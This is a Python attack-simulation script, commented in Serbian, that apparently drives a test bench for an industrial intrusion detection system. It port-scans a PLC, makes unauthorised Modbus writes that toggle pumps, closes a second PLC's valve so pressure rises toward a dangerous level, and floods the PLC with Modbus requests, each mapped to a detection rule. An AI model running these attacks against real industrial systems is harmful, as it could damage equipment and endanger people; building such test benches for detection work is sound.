# attacker/attacks.py
"""
attacks.py — NAPADAC ZA TESTOVE (rogue-sim, .99)

Napadi (biraju se preko env ATTACK):
  scan     -> skeniranje portova PLC-a            -> RULE-006
  write    -> neovlasceni Modbus upis u pumpu      -> RULE-007 (+ korelacija)
  pressure -> zatvori ventil PLC2, digni pritisak  -> RULE-007 + RULE-008 (korelacija -> CRITICAL)
  flood    -> rafal Modbus zahteva                 -> RULE-004
  rampage  -> PUN napad: sve zaredom, neke ponovljeno (svi alarmi + count)
  all      -> scan + write

Radi samo kad se pusti (za testove), nije stalni servis.
"""

import asyncio
import os
import socket
import time

from pymodbus.client import AsyncModbusTcpClient


TARGET = os.environ.get("TARGET_HOST", "192.168.10.10")
TARGET2 = os.environ.get("TARGET_HOST_2", "192.168.10.11")  # PLC2 (ventil/pritisak)
SCAN_PORTS = [21, 22, 23, 25, 80, 102, 135, 443, 445, 502, 1433, 3306, 3389, 8080, 8443]

COIL_PUMPA1 = 0
COIL_PUMPA2 = 1
COIL_VENTIL = 0  # na PLC2: coil 0 = ventil (1=otvoren, 0=zatvoren)


async def port_scan():
    """Napad 1: pokusaj vezu na mnogo portova (izvidjanje)."""
    print(f"[NAPADAC] Skeniram portove na {TARGET}...")
    for port in SCAN_PORTS:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((TARGET, port))
            print(f"[NAPADAC]   port {port} otvoren")
            s.close()
        except Exception:
            pass
    print("[NAPADAC] Skeniranje gotovo.")


async def unauthorized_write():
    """Napad 2: neovlasceni Modbus upisi u pumpe PLC1, razmaknuti > dedup (60s)."""
    print(f"[NAPADAC] Neovlasceni upisi u {TARGET}:502 (razmaknuti)...")
    client = AsyncModbusTcpClient(TARGET, port=502)
    await client.connect()
    if not client.connected:
        print("[NAPADAC]   ne mogu da se povezem na Modbus")
        return

    upisi = [
        (COIL_PUMPA1, True),
        (COIL_PUMPA2, True),
        (COIL_PUMPA1, False),
        (COIL_PUMPA2, False),
        (COIL_PUMPA1, True),
        (COIL_PUMPA2, True),
    ]
    RAZMAK = 70
    for i, (coil, vrednost) in enumerate(upisi):
        await client.write_coil(coil, vrednost)
        print(f"[NAPADAC]   upis {i+1}/{len(upisi)}: coil {coil} = {vrednost}")
        if i < len(upisi) - 1:
            await asyncio.sleep(RAZMAK)
    client.close()
    print("[NAPADAC] Upisi gotovi.")


async def pressure_attack():
    """
    Napad 3: sabotaza PLC2. Napadac pise DIREKTNO u PLC2 (zaobilazi SCADA
    lanac), zatvara ventil, cime pritisak pocinje da raste ka opasnom.

    Sta sistem uhvati:
      - RULE-007: upis u PLC koji NE dolazi od SCADA (.30) -> neovlascen
      - RULE-008: pritisak presao opasan prag (procesna posledica)
      - Korelacija: oba u istom prozoru + promena Ventil.Otvoren -> CRITICAL
    """
    print(f"[NAPADAC] Sabotaza PLC2 ({TARGET2}:502): zatvaram ventil...")
    client = AsyncModbusTcpClient(TARGET2, port=502)
    await client.connect()
    if not client.connected:
        print(f"[NAPADAC]   ne mogu da se povezem na PLC2 {TARGET2}")
        return

    await client.write_coil(COIL_VENTIL, False)
    print("[NAPADAC]   ventil ZATVOREN — pritisak ce rasti ka opasnom")

    for i in range(6):
        await asyncio.sleep(3)
        await client.write_coil(COIL_VENTIL, False)
        print(f"[NAPADAC]   drzim ventil zatvorenim ({i+1}/6)")

    client.close()
    print("[NAPADAC] Sabotaza PLC2 gotova.")


async def flood():
    """
    Napad 4: volumetrijski flood. Rafal Modbus read zahteva na PLC bez pauze
    -> jedan tok sa ogromnim brojem paketa -> RULE-004.
    """
    broj = int(os.environ.get("FLOOD_COUNT", "1000"))
    print(f"[NAPADAC] Flood: {broj} Modbus zahteva na {TARGET}:502 bez pauze...")
    client = AsyncModbusTcpClient(TARGET, port=502)
    await client.connect()
    if not client.connected:
        print("[NAPADAC]   ne mogu da se povezem za flood")
        return

    start = time.time()
    for i in range(broj):
        try:
            await client.read_holding_registers(address=0, count=1)
        except Exception:
            pass
        if (i + 1) % 200 == 0:
            print(f"[NAPADAC]   flood {i+1}/{broj}")
    trajanje = time.time() - start

    client.close()
    print(f"[NAPADAC] Flood gotov: {broj} zahteva za {trajanje:.1f}s "
          f"(~{broj/trajanje:.0f} zahteva/s)")


async def rampage():
    """
    BOGAT napad za demonstraciju: izvodi vise napada zaredom, neke i
    ponovljeno, da se aktiviraju SVI alarmi i da count (dedup) poraste.

    Redosled je namerno takav da:
      - scan se ponovi (RULE-006 count > 1)
      - neovlasceni upisi idu BRZO (unutar 60s dedup prozora) -> RULE-007 count > 1
      - pressure sabotira PLC2 -> RULE-007 + RULE-008 + korelacija
      - flood -> RULE-004
      - sve vreme napadac prica sa PLC -> RULE-001 (nov uredjaj) + RULE-002
    """
    print("[NAPADAC] === RAMPAGE: pun napad ===")

    # 1) Port scan (RULE-006)
    await port_scan()
    await asyncio.sleep(2)

    # 2) Scan JOS jednom brzo -> RULE-006 count raste (isti izvor/odrediste)
    print("[NAPADAC] Ponovni scan (za count)...")
    await port_scan()
    await asyncio.sleep(2)

    # 3) Sabotaza ventila PLC2 -> RULE-007 + RULE-008 + korelacija (glavni scenario)
    await pressure_attack()
    await asyncio.sleep(2)

    # 4) Neovlasceni upisi u pumpe PLC1, BRZO (unutar dedup prozora 60s)
    #    -> RULE-007 count raste. Namerno bez velikog razmaka.
    print("[NAPADAC] Rafal neovlascenih upisa u pumpe (za count)...")
    client = AsyncModbusTcpClient(TARGET, port=502)
    await client.connect()
    if client.connected:
        for i in range(5):
            await client.write_coil(COIL_PUMPA1, i % 2 == 0)
            print(f"[NAPADAC]   upis u pumpu {i+1}/5")
            await asyncio.sleep(2)  # blizu -> dedup broji, count raste
        client.close()

    # 5) Flood (RULE-004)
    await asyncio.sleep(2)
    await flood()

    print("[NAPADAC] === RAMPAGE gotov ===")


async def main():
    attack = os.environ.get("ATTACK", "all")

    if attack in ("scan", "all"):
        await port_scan()
        await asyncio.sleep(2)

    if attack in ("write", "all"):
        await unauthorized_write()

    if attack == "pressure":
        await pressure_attack()

    if attack == "flood":
        await flood()

    if attack == "rampage":
        await rampage()

    print("[NAPADAC] Svi napadi zavrseni.")


if __name__ == "__main__":
    asyncio.run(main())